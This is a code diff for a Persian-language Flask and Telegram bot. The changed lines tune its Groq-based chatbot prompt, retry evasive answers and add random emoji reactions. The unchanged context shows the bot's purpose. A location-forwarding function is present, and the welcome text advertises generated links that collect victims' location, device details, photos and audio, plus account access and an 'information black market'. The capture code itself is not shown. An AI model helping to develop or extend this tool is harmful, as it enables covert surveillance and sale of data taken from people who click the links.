@@ -1,4 +1,4 @@
-import os, io, uuid, base64, json, logging, sqlite3, threading, time
+import os, io, uuid, base64, json, logging, sqlite3, threading, time, random
 from datetime import datetime
 from flask import Flask, request, render_template_string, send_from_directory, jsonify, g, make_response, redirect
 import requests
@@ -98,7 +98,7 @@ def send_telegram_location(lat, lng):
     except Exception as e:
         app.logger.error(f"Telegram location failed: {e}")
 
-# -------------------- Groq AI (Strong Models) --------------------
+# -------------------- Groq AI (Professional) --------------------
 def ask_groq(prompt):
     if not GROQ_API_KEY:
         return "⚠️ کلید Groq تنظیم نشده است."
@@ -106,11 +106,18 @@ def ask_groq(prompt):
         url = "https://api.groq.com/openai/v1/chat/completions"
         headers = {"Authorization": f"Bearer {GROQ_API_KEY}", "Content-Type": "application/json"}
         models = [
-            "llama-3.3-70b-versatile",       # قوی‌ترین مدل رایگان Llama
-            "deepseek-r1-distill-llama-70b", # مدل استدلالی DeepSeek
-            "llama-3.1-8b-instant",          # ضعیف‌تر ولی سریع
+            "llama-3.3-70b-versatile",
+            "deepseek-r1-distill-llama-70b",
+            "llama-3.1-8b-instant"
         ]
-        system_prompt = "تو یک دستیار هوشمند، دقیق و دوستانه هستی. پاسخ‌های کامل، مفید و به زبان فارسی روان بده. اگر سوال برنامه‌نویسی یا فنی است، کد کامل و توضیح دقیق ارائه کن. همیشه مودب و حرفه‌ای باش."
+        system_prompt = (
+            "تو یک دستیار هوشمند، مستقیم و دقیق هستی. "
+            "به سوال کاربر مستقیماً پاسخ بده، بدون اینکه بپرسی 'درباره چه موضوعی صحبت کنیم' یا 'چه سوالی داری'. "
+            "همیشه پاسخ کامل، مفید و روان به زبان فارسی ارائه کن. "
+            "اگر سوال فنی یا برنامه‌نویسی است، کد کامل و توضیح دقیق بده. "
+            "مودب، دوستانه و حرفه‌ای باش. "
+            "مکالمه را طبیعی ادامه بده، مثل یک دوست آگاه."
+        )
         last_error = None
         for model in models:
             payload = {
@@ -119,18 +126,24 @@ def ask_groq(prompt):
                     {"role": "system", "content": system_prompt},
                     {"role": "user", "content": prompt}
                 ],
-                "temperature": 0.7,
+                "temperature": 0.8,
                 "max_tokens": 2048
             }
             resp = requests.post(url, json=payload, headers=headers, timeout=30)
             if resp.status_code == 200:
                 data = resp.json()
-                return data['choices'][0]['message']['content'].strip()
+                answer = data['choices'][0]['message']['content'].strip()
+                # اگر پاسخ حاوی عبارت‌های انحرافی بود، سعی بعدی
+                if "چه موضوعی" in answer or "چه سوالی" in answer or "در مورد چه" in answer:
+                    continue
+                return answer
             else:
                 last_error = f"مدل {model}: {resp.status_code} - {resp.text[:200]}"
                 app.logger.warning(f"Groq model {model} failed: {resp.status_code}")
-        app.logger.error(f"Groq all models failed: {last_error}")
-        return f"❌ هوش مصنوعی در دسترس نیست.\n{last_error}"
+        # اگر همه مدل‌ها پاسخ نامناسب دادند، پاسخ آخرین مدل را برگردان
+        if last_error:
+            return f"❌ هوش مصنوعی در دسترس نیست.\n{last_error}"
+        return answer  # fallback to last answer even if it contained those phrases
     except Exception as e:
         app.logger.error(f"Groq exception: {e}")
         return "❌ خطا در ارتباط با هوش مصنوعی."
@@ -662,6 +675,8 @@ def award_points(user_id, amount):
     conn.close()
 
 # -------------------- Bot Handlers --------------------
+REACTIONS = ["👍", "❤️", "🔥", "👏", "😍", "⚡", "💯", "🤩"]
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat.type == 'private':
         user = update.effective_user
@@ -679,7 +694,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📊 اطلاعات کامل دستگاه (باتری، شبکه، مدل دقیق) و عکس صدا و... دریافت کنید.\n\n"
         "دسترسی به انواع حساب ها ، مود تمام گیم ها و هزاران دستور خفن که با بالارفتن امتیاز فعال میشه\n"
         "🛒 بازار سیاه اطلاعات برای خرید و فروش\n"
-        "🤖 هوش مصنوعی: پاسخگویی به پیام‌های خصوصی و ویس."
+        "🤖 هوش مصنوعی حرفه‌ای: پاسخگویی به پیام‌های خصوصی و ویس."
     )
     keyboard = [
         [InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
@@ -831,6 +846,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         conn.execute("INSERT OR REPLACE INTO groups (chat_id, title) VALUES (?, ?)", (msg.chat.id, msg.chat.title or "نامشخص"))
         conn.commit(); conn.close()
 
+    # واکنش تصادفی ربات
+    if random.random() < 0.2:  # 20% احتمال
+        emoji = random.choice(REACTIONS)
+        try:
+            await msg.set_reaction(reaction=[emoji], is_big=False)
+        except:
+            pass
+
     if context.user_data.get('awaiting_group_message'):
         group_id = context.user_data.pop('awaiting_group_message')
         try:
@@ -929,16 +952,17 @@ async def handle_reaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     chat_id = reaction.chat.id
     message_id = reaction.message_id
+    user = reaction.user
+    if not user:
+        return
     try:
         msg = await context.bot.get_message(chat_id=chat_id, message_id=message_id)
         if msg and msg.from_user.id == context.bot.id:
-            user = reaction.user
-            if user:
-                await context.bot.send_message(
-                    chat_id=chat_id,
-                    text=f"😍 ممنون از واکنشت {user.mention_html()}!",
-                    parse_mode="HTML"
-                )
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"😍 ممنون از واکنشت {user.mention_html()}!",
+                parse_mode="HTML"
+            )
     except Exception as e:
         app.logger.error(f"Reaction error: {e}")
 
